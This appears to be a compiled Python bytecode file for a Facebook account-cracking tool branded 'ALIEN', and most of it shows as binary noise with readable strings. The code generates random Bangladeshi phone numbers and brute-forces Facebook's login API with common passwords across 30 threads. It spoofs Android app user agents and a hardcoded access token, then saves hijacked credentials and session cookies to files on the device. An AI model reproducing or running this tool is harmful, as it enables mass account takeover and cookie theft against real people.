�
    ���f�.  �                   ��  � d dl Z d dlZd dlZd dl mZ d dlZd dlZd dlZd dlZd dlm	Z
 d dlm	Z	 	 d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlT d dlmZ n# e$ r  e j        d�  �         Y n Y nxY wg Zd ag ag Zg ZdZdZd	Zd
ZdZ d� Z!d� Z"d� Z# ej$        g d��  �        Z%d� Z&d e' ej(        dd�  �        �  �        z   dz    e' ej(        dd�  �        �  �        z   dz    e' ej(        dd�  �        �  �        z   dz    e' ej(        d d�  �        �  �        z   dz   Z) ej$        g d��  �        Z* ej$        g d��  �        Z+ ej$        g d��  �        Z,d� Z-d � Z.d!� Z/ e#�   �          dS )"�    N)�path)�BeautifulSoup)�*)�ThreadPoolExecutorz+pip install requests futures==2 > /dev/null�[1;37mz
[38;5;46mz
[38;5;45mz[38;5;196mu�  
     [38;5;46m█████  [38;5;196m██      [38;5;214m██ [38;5;96m███████ [38;5;226m███    ██ 
    [38;5;47m██   ██ [38;5;197m██      [38;5;215m██ [38;5;97m██      [38;5;227m████   ██ 
    [38;5;48m███████ [38;5;198m██      [38;5;216m██ [38;5;98m█████   [38;5;228m██ ██  ██ 
    [38;5;49m██   ██ [38;5;199m██      [38;5;217m██ [38;5;99m██      [38;5;229m██  ██ ██ 
    [38;5;50m██   ██ [38;5;199m███████ [38;5;218m██ [38;5;99m███████ [38;5;229m██   ████ 
 [38;5;214m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 [38;5;196m[[38;5;46m+[38;5;196m] [1;97m[1;37mDeveloper :  Hamim Farabi
 [38;5;196m[[38;5;46m+[38;5;196m] [1;97m[1;37mFacebook  :  Hamim Portace
 [38;5;196m[[38;5;46m+[38;5;196m] [1;97m[1;37mVersions  :  [1;37m0.1                   
 [38;5;214m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━c                  �V   � t          j        d�  �         t          t          �  �         d S )N�clear)�os�system�print�fuck� �    �/storage/emulated/0/x.py�xr   0   s!   � ��I�g����	�$�K�K�K�K�Kr   c                  �$   � t          d�  �         d S )Nu�   [38;5;214m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)r   r   r   r   �xnxxr   4   s)   � �	�  [�  \�  \�  \�  \�  \r   c                  �  � t          �   �          t          d�  �         t          d�  �         t          �   �          t          d�  �        } | dv rt	          �   �          d S | dv r%t          d�  �         t          j        d�  �         d S d S )Nz8 [38;5;196m[[38;5;46mA[38;5;196m][1;97m Random crackz0 [38;5;196m[[38;5;46mE[38;5;196m][1;97m Exitz5 [38;5;196m[[38;5;46m?[38;5;196m][1;97m Choice : �1Aa�2EezAllah hafiz �exit)r   r   r   �input�rndmxr
   r   )�xtxs    r   �bhootxxr   7   s�   � ��C�C�C�	�
P�Q�Q�Q�	�
H�I�I�I�$�&�&�&�
�S�
T�
T�C�
�i���������	�	�	�	��n����
�	�&������ 
�	r   )a   Dalvik/2.1.0 (Linux; U; Android 10; CPH2025 Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/227.0.0.43.158;FBPN/com.facebook.katana;FBLC/es_US;FBBV/160467766;FBCR/UNEFON 4G;FBMF/oppo;FBBD/oppo;FBDV/CPH2025;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]a&  Dalvik/2.1.0 (Linux; U; Android 10; RMX3063 Build/RZBS31.Q2-143-27-7) [FBAN/Orca-Android;FBAV/225.0.0.47.118;FBPN/com.facebook.orca;FBLC/en_US;FBBV/158425850;FBCR/cricket;FBMF/realme;FBBD/realme;FBDV/RMX3063;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;] FBBK/1a   Dalvik/2.1.0 (Linux; U; Android 13; 23106RN0DA Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/227.0.0.43.158;FBPN/com.facebook.orca;FBLC/es_US;FBBV/160467766;FBCR/TELCEL;FBMF/xiaomi;FBBD/xiaomi;FBDV/23106RN0DA;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]a,  Dalvik/2.1.0 (Linux; U; Android 10; SM-M405F Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/225.0.0.47.118;FBPN/com.facebook.orca;FBLC/en_US;FBBV/158425850;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-M405F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1354};FB_FW/1;]c                  �>  � t          �   �          t          d�  �         t          �   �          t          d�  �        } t          �   �          	 t          d�  �         t          �   �          t	          t          d�  �        �  �        }n# t
          $ r d}Y nw xY wt          |�  �        D ]H}d�                    d� t          d�  �        D �   �         �  �        }t          �	                    |�  �         �It          d	�
�  �        5 }t          �   �          t          t          t          �  �        �  �        }t          dt          t          t          �  �        �  �        � ��  �         t          d| � ��  �         t          �   �          t          D ]?}| |z   }|||d d�         |d d�         ddddddg
}|�                    t          ||�  �         �@	 d d d �  �         n# 1 swxY w Y   t          dt          t          t          �  �        �  �        � ��  �         t          �   �          d S )NzJ [38;5;196m[[38;5;46m+[38;5;196m][1;97m Bd Sim Code : 017,019,018,016 z3 [38;5;196m[[38;5;46m?[38;5;196m][1;97m CODE : zB [38;5;196m[[38;5;46m+[38;5;196m][1;97m Limit : 999,9999,99999z4 [38;5;196m[[38;5;46m+[38;5;196m][1;97m Limit : i�  � c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)�random�choice�string�digits)�.0�_s     r   �	<genexpr>zrndmx.<locals>.<genexpr>O   s.   � � � �I�I�1�&�-���6�6�I�I�I�I�I�Ir   �   �   )�max_workersz9 [38;5;196m[[38;5;46m+[38;5;196m][1;97m Accounts  :  z9 [38;5;196m[[38;5;46m+[38;5;196m][1;97m Operator  :  �   �
Bangladesh�506070�607080�908070�sadiya�mimmimz6 [38;5;196m[[38;5;46m+[38;5;196m][1;97m TOTAL OK -)r   r   r   r   �int�
ValueError�range�join�jan�append�tred�str�len�submit�sexx�oks)	�dog�limit�nmbr�xxx�tanox�tl�psx�ids�passlists	            r   r   r   D   sI  � ��C�C�C�	�
b�c�c�c�dh�dj�dj�dj�
�Q�
R�
R�C��C�C�C���^�_�_�_�`d�`f�`f�`f��E�\�]�]�^�^����� � � ��E�E�E������e��� � ���'�'�I�I��a���I�I�I�I�I�C��J�J�s�O�O�O�O�	�"�	�	�	� 0���C�C�C��S��X�X���B��i�Z]�^a�be�^f�^f�Zg�Zg�i�i�j�j�j��_�Z]�_�_�`�`�`�ae�ag�ag�ag�� 0� 0���#�g����C����G�C����G�L��(�S[�\d�em�n�����T�#�h�/�/�/�/�0�0� 0� 0� 0� 0� 0� 0� 0� 0� 0� 0���� 0� 0� 0� 0� 
�
^�s�SV�WZ�S[�S[�}�}�
^�
^�_�_�_��F�F�F�F�Fs%   �
9B �B�B�>CG�G�Gz[FBAN/FB4A;FBAV/�o   iM  z.0.0.�   �	   �.��   z;FBBV/i�ɚ;z�;[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/308616431;FBDM/{density=2.678,width=1080,height=1976};FBLC/en_US;FBCR/vodafone;FBMF/xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/SM-M315F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;])�en_US�id_ID�lt_LT�it_IT�en_GB)�vodafone�Robi�skitto�
Banglalink�Airtel�Grameenphone�null)zSM-M305MzSM-M205FzSM-M135FzSM-M107FzSM-E225FzSM-A415FzSM-N960FzSM-N950UzSM-N9300zSM-N980Fz	SM-N970U1zSM-M625FzSM-M536Bc                  �  � dt          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   d	z   t          t          �  �        z   d
z   t          t          �  �        z   dz   t          t
          �  �        z   dz   t          t          j        dd�  �        �  �        z   dz   } dt          t          j        dd�  �        �  �        z   dz   t          t
          �  �        z   dz   t          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   dz   t          | �  �        z   dz   }|S )Nz<[FBAN/FB4A;FBAV/382.0.0.33.111;FBBV/316416485;FBDM/{density=�   �   rH   �   z,width=1080,height=19r   �c   z};FBLC/z;FBCR/z9;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/z;FBSV/rG   �   z;FBOP/1;FBCA/arm64-v8a:;]z Dalvik/2.1.0 (Linux; U; Android z; z Build/SP1A.i� i?B rE   i�  z) r   )r7   r   �randint�FBLC�FBCR�FBDV�	randrange)�END�uas     r   �uaarc   b   s�  � �L�S�QW�Q_�`a�bc�Qd�Qd�Me�Me�e�fi�i�jm�nt�n|�}~�  @A�  oB�  oB�  kC�  kC�  C�  D[�  [�  \_�  `f�  `n�  oq�  rt�  `u�  `u�  \v�  \v�  v�  w@�  @�  AD�  EI�  AJ�  AJ�  J�  KS�  S�  TW�  X\�  T]�  T]�  ]�  ^Y�  Y�  Z]�  ^b�  Zc�  Zc�  c�  dl�  l�  mp�  qw�  q�  @A�  BD�  qE�  qE�  mF�  mF�  F�  Gb�  b��/��F�4D�Q�r�4J�4J�0K�0K�K�D�P�QT�UY�QZ�QZ�Z�[i�i�jm�nt�n~�  @F�  GM�  oN�  oN�  kO�  kO�  O�  PS�  S�  TW�  X^�  Xh�  il�  mp�  Xq�  Xq�  Tr�  Tr�  r�  sw�  w�  x{�  |�  x@�  x@�  @�  AC�  C���	r   c                 �f   � t          t          j        d| � d��  �        j        �  �        }d|v rdS dS )N�https://graph.facebook.com/�/picture?type=normal�	Photoshop�Active�Locked)r7   �requests�get�text)�iid�reqs     r   �lock_chakerro   h   s=   � �
�8�<�O�c�O�O�O�P�P�U�V�V���3���	��	�r   c                 �r  � t           j        �                    dt          � dt	          t
          �  �        � d��  �         t           j        �                    �   �          	 |D �]4}d}t          j        �   �         }t          d�
                    |�                    t          j        d��  �        �  �        �  �        }t          t          j        �   �         �  �        }|d|| |d	d
dddd	d	dd�}d|� �ddt!          �   �         dddd�}d}	d}
t#          j        |	||��  �        �                    �   �         }d|v r�|d         }d|� d�}t#          j        |�  �        j        }d|v r�t-          dt          |�  �        � d|� d ��  �         d!�
                    d"� |d#         D �   �         �  �        }t-          d$|� ��  �         t/          d%d&�  �        �                    t          |�  �        d'z   |z   d(z   �  �         t
          �                    t          |�  �        �  �          �n{���|
t          |�  �        v r�	 |d)         d*         d         }n#  t2          }Y nxY w|t
          v r���t-          d+|� d|� d,��  �         t/          d-d&�  �        �                    t          |�  �        d'z   |z   d(z   �  �         |
�                    t          |�  �        �  �          n�d.|d)         d/         v r�	 |d)         d*         d         }n	#  | }Y nxY w|t
          v r���t-          d0t          |�  �        z   dz   |z   d,z   �  �         t/          d1d&�  �        �                    t          |�  �        d'z   |z   d(z   �  �         t4          �                    t          | �  �        �  �          n��6t          d2z  ad S # t6          $ r}Y d }~d S d }~ww xY w)3NzM [38;5;196m[[38;5;46m+[38;5;196m] [[38;5;46mALIENX[38;5;196m] [[1;97mz[38;5;196m] [[38;5;46mOK:-z[38;5;196m]z-350685531728|62f8ce9f74b12f84c123cc23437a4a32r   �   )�k�json�1�password�login�button_with_disabled�false�authenticate)�adid�format�	device_id�emailru   �generate_analytics_claims�credentials_type�source�error_detail_type�enroll_misauth�generate_session_cookies�generate_machine_id�fb_api_req_friendly_namezOAuth �unknownzgzip, deflatez!application/x-www-form-urlencoded�Liger)�AuthorizationzX-FB-Friendly-NamezX-FB-Connection-Typez
User-AgentzAccept-EncodingzContent-TypezX-FB-HTTP-Enginez'https://b-graph.facebook.com/auth/loginzKLogin approvals are on. Expect an SMS shortly with a code to use for log in)�data�headers�session_key�uidre   rf   rg   zf [38;5;196m[[38;5;46m+[38;5;196m][38;5;46m [38;5;196m[[38;5;46mALIEN-OK[38;5;196m][38;5;46m z | � �;c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS )�name�=�valueNr   )r#   �is     r   r%   zsexx.<locals>.<genexpr>�   s4   � � � �7p�7p�UV��&�	�#��a��j�8P�7p�7p�7p�7p�7p�7pr   �session_cookiesue    [38;5;196m[[38;5;46m+[38;5;196m][38;5;46m [38;5;196m[[38;5;46mCOOKIE🍪[38;5;196m][38;97m z/sdcard/X-OK.txt�a�|�
�error�
error_dataz< [38;5;196m[[38;5;46m+[38;5;196m][38;5;45m [ALIEN-2F] r   z/sdcard/X-2F.txtzwww.facebook.com�messagez2 [38;5;196m[[38;5;46m+[38;5;196m] [ALIEN-CP] z/sdcard/X-CP.txtrF   )�sys�stdout�write�loopr8   r;   �flushr   �Randomr7   r3   �choicesr!   �	hexdigits�uuid�uuid4rc   rj   �postrs   rk   rl   r   �openr5   �idf�cps�	Exception)rC   rD   �pas�accessToken�random_seedrz   r|   �cat�heda�url�twf�por�   �ckk�res�coki�es                    r   r:   r:   p   s�  � � 	�
���  �  ~B�  �  �  fi�  jm�  fn�  fn�  �  �  �  	@�  	@�  	@��
������B	�#� >&� >&�C�&U��&,�m�o�o��"�2�7�7�;�+>�+>�v�?O�SU�+>�+V�+V�#W�#W�X�X��$'��
���$5�$5�	�'+�)/�,5�(+�+.�<?�3=�)0�4J�18�;>�69�;I�L� L�� /E�{�.D�.D�5C�7@�.1�e�e�2A�0S�4;�=� =�� H��z��%�]�3�C��E�E�E�J�J�L�L��(�B�.�.� "�5�	�#� W�c� W� W� W�#� (��S� 1� 1� 6�#�(�C�/�/�(-�  /E�  ru�  vy�  rz�  rz�  /E�  /E�  B�  /E�  /E�  /E�  )F�  )F�  )F�/2�x�x�7p�7p�Z\�]n�Zo�7p�7p�7p�/p�/p��(-�  /v�  pt�  /v�  /v�  )w�  )w�  )w�(,�-?��(D�(D�(J�(J�3�s�8�8�TW�<�X[�K[�\`�K`�(a�(a�(a�(+�
�
�3�s�8�8�(<�(<�(<�(-�� 0� !�C��G�G�^�^�!2�.0��k�,�.G��.N����!2�.1�������#&�#�:�:�d�(-�  /S�{~�  /S�  /S�  DG�  /S�  /S�  /S�  )T�  )T�  )T�(,�-?��(D�(D�(J�(J�3�s�8�8�TW�<�X[�K[�\`�K`�(a�(a�(a�(+�
�
�3�s�8�8�(<�(<�(<�(-��/�2�g�;�y�3I�I�I�!2�.0��k�,�.G��.N����!2�.1�������#&�#�:�:�d�(-�.m�nq�ru�nv�nv�.v�w|�.|�  ~A�  /A�  BN�  /N�  )O�  )O�  )O�(,�-?��(D�(D�(J�(J�3�s�8�8�TW�<�X[�K[�\`�K`�(a�(a�(a�(+�
�
�3�s�8�8�(<�(<�(<�(-��%��a������� 	� 	� 	�����������	���sE   �GN! �.I�N! �	I�BN! � K5�4N! �5K;�9B&N! �!
N6�1N6)0r
   �timer�   r   �urllib�pip�base64�zlib�bs4r   �soprj   rs   �rer   r�   r!   �
subprocess�concurrent.futuresr   r6   �ModuleNotFoundErrorr   r4   r�   r;   r�   r�   �W�G�F�Rr   r   r   r   r    �exxr   r7   r\   �fb_uar]   r^   r_   rc   ro   r:   r   r   r   �<module>r�      sj  �� 
�	�	�	� ���� 
�
�
�
� � � � � � � ���� 
�
�
�
� ���� ���� $� $� $� $� $� $� � � � � � ��I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�����A�A�A�A�A�A�A��� B� B� B���	�@�A�A�A�A�A� �t�t�������������� ��������
	Q��� � �\� \� \�	� 	� 	� �F�M�  r�  r�  r�  s�  s��� � �2 ���^�V�^�C��4�4�5�5�5�g�=�c�c�.�&�.�QR�ST�BU�BU�>V�>V�V�WZ�Z�[^�[^�_m�_e�_m�nq�ru�_v�_v�[w�[w�w�  yA�  A�  BE�  BE�  FT�  FL�  FT�  U^�  _h�  Fi�  Fi�  Bj�  Bj�  j�  kI�  I���v�}�>�>�>�?�?���v�}�]�]�]�^�^���v�}�  g�  g�  g�  h�  h��� � �� � �G� G� G�R ��	�	�	�	�	s   �2A# �#A=�:A=